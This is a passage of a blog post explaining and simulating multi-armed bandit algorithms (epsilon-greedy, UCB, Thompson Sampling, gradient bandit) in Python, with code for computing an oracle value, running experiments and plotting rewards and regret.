<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Simulation | Multi-Armed Bandit Algorithm - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Simulation | Multi-Armed Bandit Algorithm</h1>
			
		</header>
		<div class="content post__content clearfix">
			


                <div id="content_views" class="markdown_views prism-atom-one-dark">
                    
                        
                    
                    <h1>
<a id="Simulation__MultiArmed_Bandit_Algorithm_1"></a>Simulation | Multi-Armed Bandit Algorithm</h1> 
<hr> 
<p><img src="https://images2.imgbox.com/f9/58/WImRgA9d_o.jpg" alt="在这里插入图片描述"></p> 
<h2>
<a id="I_Propose_6"></a>I. Propose</h2> 
<p><span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        ∙
       
      
      
       bullet
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.44445em;vertical-align: 0em"></span><span class="mord">∙</span></span></span></span></span> Simulation of Multi-Armed Bandit Algorithms: <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        ε
       
      
      
       varepsilon
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">ε</span></span></span></span></span>-Greedy, UCB(Upper Confidence Bound), Thompson Sampling and Gradient Bandit Algorithm.</p> 
<p><span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        ∙
       
      
      
       bullet
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.44445em;vertical-align: 0em"></span><span class="mord">∙</span></span></span></span></span> Compare the algorithms with different parameter and give explanation for these impact.</p> 
<p><span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        ∙
       
      
      
       bullet
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.44445em;vertical-align: 0em"></span><span class="mord">∙</span></span></span></span></span> Explain the understanding of the exploration-exploitation trade-off in bandit-algorithms.</p> 
<p><span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        ∙
       
      
      
       bullet
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.44445em;vertical-align: 0em"></span><span class="mord">∙</span></span></span></span></span> Solve the further problem: dependent case.</p> 
<p><span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        ∙
       
      
      
       bullet
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.44445em;vertical-align: 0em"></span><span class="mord">∙</span></span></span></span></span> Explain why sublinear regret is the performance threshold between good bandit algorithms and bad one.</p> 
<hr> 
<h2>
<a id="II_Simulation_20"></a>II. Simulation</h2> 
<h3>
<a id="Step_1_Oracle_Value_of_Bernoulli_Distribution_21"></a>Step 1: Oracle Value of Bernoulli Distribution</h3> 
<p>Suppose we have known the true values of the parameters of the Bernoulli Distribution <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        B
       
       
        e
       
       
        r
       
       
        n
       
       
        (
       
       
        
         θ
        
        
         j
        
       
       
        )
       
      
      
       Bern( theta_j )
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.03611em;vertical-align: -0.286108em"></span><span class="mord mathdefault" style="margin-right: 0.05017em">B</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right: 0.02778em">r</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.02778em">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: -0.02778em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right: 0.05724em">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.286108em"><span class=""></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span> of each arm (the probability of each bandit gives a reward) as below:</p> 
<p><span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         θ
        
        
         1
        
       
       
        =
       
       
        0.9
       
       
        ,
       
       
        
         θ
        
        
         2
        
       
       
        =
       
       
        0.8
       
       
        ,
       
       
        
         θ
        
        
         3
        
       
       
        =
       
       
        0.7
       
      
      
       theta_1 = 0.9,theta_2 = 0.8,theta_3 = 0.7
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.84444em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.02778em">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.02778em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.88888em;vertical-align: -0.19444em"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">9</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.02778em">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.02778em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.88888em;vertical-align: -0.19444em"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.02778em">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.02778em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.64444em;vertical-align: 0em"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">7</span></span></span></span></span></p> 
<p>We can use the parameters above to compute the expectation of aggregate rewards of each arm over N=10000 times slots, which can be achieved by testing Bin(<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        N
       
      
      
       N
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.68333em;vertical-align: 0em"></span><span class="mord mathdefault" style="margin-right: 0.10903em">N</span></span></span></span></span>,<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         θ
        
        
         j
        
       
      
      
       theta_j
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.980548em;vertical-align: -0.286108em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.02778em">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: -0.02778em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right: 0.05724em">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.286108em"><span class=""></span></span></span></span></span></span></span></span></span></span>) .</p> 
<p>The test function with parameters <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         θ
        
        
         j
        
       
      
      
       theta_j
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.980548em;vertical-align: -0.286108em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.02778em">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: -0.02778em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right: 0.05724em">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.286108em"><span class=""></span></span></span></span></span></span></span></span></span></span> is as below:</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> math
<span class="token keyword">import</span> random
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">from</span> collections <span class="token keyword">import</span> Counter
<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt
<span class="token keyword">from</span> scipy<span class="token punctuation">.</span>stats <span class="token keyword">import</span> beta

<span class="token keyword">def</span> <span class="token function">oracle</span><span class="token punctuation">(</span>N<span class="token punctuation">,</span>theta<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># experiments of bin(n, theta)</span>
    arm <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>binomial<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>theta<span class="token punctuation">,</span>N<span class="token punctuation">)</span>

    <span class="token comment">#output the total times of success</span>
    <span class="token keyword">return</span> Counter<span class="token punctuation">(</span>arm<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
</code></pre> 
<p>The test function above outputs the total successful times of Bern(<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         θ
        
        
         j
        
       
      
      
       theta_j
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.980548em;vertical-align: -0.286108em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.02778em">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: -0.02778em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right: 0.05724em">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.286108em"><span class=""></span></span></span></span></span></span></span></span></span></span>) over <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        N
       
      
      
       N
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.68333em;vertical-align: 0em"></span><span class="mord mathdefault" style="margin-right: 0.10903em">N</span></span></span></span></span> times slots. Then we can use the function to compute the theoretically maximized expected rewards (oracle value).</p> 
<p>The result is as below:</p> 
<pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">Oracle</span><span class="token punctuation">(</span>arm_mean<span class="token punctuation">,</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token comment">#first arm with theta_1 = 0.8</span>
    arm_1 <span class="token operator">=</span> oracle<span class="token punctuation">(</span>N<span class="token punctuation">,</span>arm_mean<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token comment">#second bandit with theta_2 = 0.6</span>
    arm_2 <span class="token operator">=</span> oracle<span class="token punctuation">(</span>N<span class="token punctuation">,</span>arm_mean<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token comment">#third bandit with theta_3 = 0.5</span>
    arm_3 <span class="token operator">=</span> oracle<span class="token punctuation">(</span>N<span class="token punctuation">,</span>arm_mean<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token comment">#compute the maximum of the expectation of three bandits</span>
    arm <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>arm_1<span class="token punctuation">,</span>arm_2<span class="token punctuation">,</span>arm_3<span class="token punctuation">]</span><span class="token punctuation">)</span>
    max_i <span class="token operator">=</span> np<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>arm<span class="token punctuation">)</span>
    maximum <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>arm_1<span class="token punctuation">,</span>arm_2<span class="token punctuation">,</span>arm_3<span class="token punctuation">)</span>

    <span class="token keyword">return</span> maximum<span class="token punctuation">,</span>max_i

arm_mean <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0.9</span><span class="token punctuation">,</span><span class="token number">0.8</span><span class="token punctuation">,</span><span class="token number">0.7</span><span class="token punctuation">]</span>
N <span class="token operator">=</span> <span class="token number">10000</span>

oracle_value<span class="token punctuation">,</span>max_i <span class="token operator">=</span> Oracle<span class="token punctuation">(</span>arm_mean<span class="token punctuation">,</span>N<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The oracle value is {}, from arm {}."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>oracle_value<span class="token punctuation">,</span>max_i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/c8/14/UiV2cN8r_o.png" alt="在这里插入图片描述"></p> 
<p>From the result, we can find if we have known the probability of success of each arm: <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         θ
        
        
         j
        
       
      
      
       theta_j
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.980548em;vertical-align: -0.286108em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.02778em">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: -0.02778em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right: 0.05724em">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.286108em"><span class=""></span></span></span></span></span></span></span></span></span></span>, it is obvious to choose the bandit with the maximized probability to get the theoretically maximized aggregate expectation, which is the oracle value.<br> To test the performance of these algorithms, firstly we generate a function named <strong>run_algorithm</strong> to run these three algorithm. The final ouput is arrays that record the mean of <strong>average reward</strong> and <strong>cumlative reward</strong> after each experiment with <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        N
       
       
        =
       
       
        5000
       
      
      
       N=5000
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.68333em;vertical-align: 0em"></span><span class="mord mathdefault" style="margin-right: 0.10903em">N</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.64444em;vertical-align: 0em"></span><span class="mord">5</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span></span></span></span></span> slots.</p> 
<pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">run_algorithm</span><span class="token punctuation">(</span>algo<span class="token punctuation">,</span> arms<span class="token punctuation">,</span> num_exper<span class="token punctuation">,</span> num_slot<span class="token punctuation">)</span><span class="token punctuation">:</span>
    
    <span class="token comment">#initialize the arrays record the rewards and chosen arms</span>
    rewards <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span>num_exper<span class="token punctuation">,</span>num_slot<span class="token punctuation">)</span><span class="token punctuation">)</span>
    chosen_arm <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span>num_exper<span class="token punctuation">,</span>num_slot<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> exper <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num_exper<span class="token punctuation">)</span><span class="token punctuation">:</span>
        
        <span class="token comment">#initialize the algorithm</span>
        algo<span class="token punctuation">.</span>initialize<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>arms<span class="token punctuation">)</span><span class="token punctuation">)</span>
        
        <span class="token keyword">for</span> slot <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num_slot<span class="token punctuation">)</span><span class="token punctuation">:</span>
            
            <span class="token comment">#obtain the factor of update</span>
            arm <span class="token operator">=</span> algo<span class="token punctuation">.</span>best_arm<span class="token punctuation">(</span><span class="token punctuation">)</span>
            reward <span class="token operator">=</span> arms<span class="token punctuation">[</span>arm<span class="token punctuation">]</span><span class="token punctuation">.</span>draw<span class="token punctuation">(</span><span class="token punctuation">)</span>

            <span class="token comment">#update the data</span>
            chosen_arm<span class="token punctuation">[</span>exper<span class="token punctuation">,</span>slot<span class="token punctuation">]</span> <span class="token operator">=</span> arm
            rewards<span class="token punctuation">[</span>exper<span class="token punctuation">,</span>slot<span class="token punctuation">]</span> <span class="token operator">=</span> reward
            algo<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arm<span class="token punctuation">,</span>reward<span class="token punctuation">,</span>slot<span class="token punctuation">)</span>

    <span class="token comment">#compute the average and cumulation of rewards</span>
    average_reward <span class="token operator">=</span> np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>rewards<span class="token punctuation">,</span>axis<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>    
    cumulative_reward <span class="token operator">=</span> np<span class="token punctuation">.</span>cumsum<span class="token punctuation">(</span>average_reward<span class="token punctuation">)</span>

    <span class="token keyword">return</span> chosen_arm<span class="token punctuation">,</span>average_reward<span class="token punctuation">,</span>cumulative_reward
    
</code></pre> 
<p>Also, we need to generate a function named <strong>plot_algorithm</strong> to plot the output of each algorithm. And then we can compare the performance of each algorithm with different parameters by the plots.</p> 
<pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">plot_algorithm</span><span class="token punctuation">(</span>algo_name<span class="token punctuation">,</span> para<span class="token punctuation">,</span> arms<span class="token punctuation">,</span> arm_mean<span class="token punctuation">,</span> num_exper<span class="token punctuation">,</span> num_slot<span class="token punctuation">,</span> label<span class="token punctuation">)</span><span class="token punctuation">:</span>

    fig<span class="token punctuation">,</span>axes <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>figsize<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    R <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    Percentage <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    optimal_arm <span class="token operator">=</span> np<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>arm_mean<span class="token punctuation">)</span>

    <span class="token comment">#Greedy and UCB</span>
    <span class="token keyword">if</span> algo_name <span class="token operator">==</span> Greedy <span class="token keyword">or</span> algo_name <span class="token operator">==</span> UCB<span class="token punctuation">:</span>
        <span class="token keyword">for</span> para <span class="token keyword">in</span> para<span class="token punctuation">:</span>

            <span class="token comment">#run the algorithm</span>
            algo <span class="token operator">=</span> algo_name<span class="token punctuation">(</span>para<span class="token punctuation">)</span>
            chosen_arm<span class="token punctuation">,</span>average_reward<span class="token punctuation">,</span>cumulative_reward <span class="token operator">=</span> 
                run_algorithm<span class="token punctuation">(</span>algo<span class="token punctuation">,</span>arms<span class="token punctuation">,</span>num_exper<span class="token punctuation">,</span>num_slot<span class="token punctuation">)</span>

            <span class="token comment">#plot the average reward</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>average_reward<span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>label<span class="token punctuation">}</span></span><span class="token string"> = </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>para<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"Slots"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"Average Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Average Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">"lower right"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylim<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

            <span class="token comment">#plot the cumulative reward</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>cumulative_reward<span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>label<span class="token punctuation">}</span></span><span class="token string"> = </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>para<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"Slots"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"Cumulative Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Cumulative Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">"lower right"</span><span class="token punctuation">)</span>

            <span class="token comment">#regret part</span>
            regret <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span>num_exper<span class="token punctuation">,</span>num_slot<span class="token punctuation">)</span><span class="token punctuation">)</span>
            average_regret <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>num_slot<span class="token punctuation">)</span>
            optimal_num <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>num_slot<span class="token punctuation">)</span>
            optimal_percent <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>num_slot<span class="token punctuation">)</span>

            <span class="token comment">#calculate the regret</span>
            <span class="token keyword">for</span> exper <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num_exper<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">for</span> slot <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num_slot<span class="token punctuation">)</span><span class="token punctuation">:</span>
                    regret<span class="token punctuation">[</span>exper<span class="token punctuation">,</span>slot<span class="token punctuation">]</span> <span class="token operator">=</span> arm_mean<span class="token punctuation">[</span>optimal_arm<span class="token punctuation">]</span> <span class="token operator">-</span> arm_mean<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>chosen_arm<span class="token punctuation">[</span>exper<span class="token punctuation">,</span>slot<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
                    <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>chosen_arm<span class="token punctuation">[</span>exper<span class="token punctuation">,</span>slot<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> optimal_arm<span class="token punctuation">:</span>
                        optimal_num<span class="token punctuation">[</span>slot<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>
            optimal_percent <span class="token operator">=</span> optimal_num<span class="token operator">/</span>num_exper
            average_percent <span class="token operator">=</span> np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>optimal_percent<span class="token punctuation">)</span>
            average_regret <span class="token operator">=</span> np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>regret<span class="token punctuation">,</span>axis<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
            total_regret <span class="token operator">=</span> np<span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span>average_regret<span class="token punctuation">)</span>
            cumulative_regret <span class="token operator">=</span> np<span class="token punctuation">.</span>cumsum<span class="token punctuation">(</span>average_regret<span class="token punctuation">)</span>

            <span class="token comment">#plot the regret as a function of time</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>cumulative_regret<span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>label<span class="token punctuation">}</span></span><span class="token string"> = </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>para<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"Slots"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"Cumulative Regret"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Cumulative Regret"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">"lower right"</span><span class="token punctuation">)</span>

            <span class="token comment">#plot the optimal action percent as a function of slots</span>
